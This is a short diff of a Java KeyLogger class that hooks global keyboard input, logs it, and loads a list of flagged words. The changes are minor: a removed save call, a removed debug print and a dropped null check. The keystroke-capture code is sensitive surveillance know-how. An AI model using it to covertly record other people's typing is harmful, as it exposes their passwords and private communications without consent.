@@ -52,15 +52,9 @@ public abstract class KeyLogger {
         } catch (NativeHookException e) {
             e.printStackTrace();
         }
-        try {
-            saveMessage();
-        } catch (IOException e) {
-            e.printStackTrace();
-        }
     }
 
     private void writeToFile(String file) {
-        System.out.println(file);
         log.add(file + "\n");
         setDefaults();
     }
@@ -79,12 +73,10 @@ public abstract class KeyLogger {
         ArrayList<String> badWords = new ArrayList<>();
         Scanner scanner = null;
         scanner = new Scanner(badWordsFilePath);
-        if(scanner != null) {
-            while (scanner.hasNext()) {
-                badWords.add(scanner.nextLine());
-                }
-            scanner.close();
-        }
+        while (scanner.hasNext()) {
+            badWords.add(scanner.nextLine());
+            }
+        scanner.close();
         return badWords;
     }
 
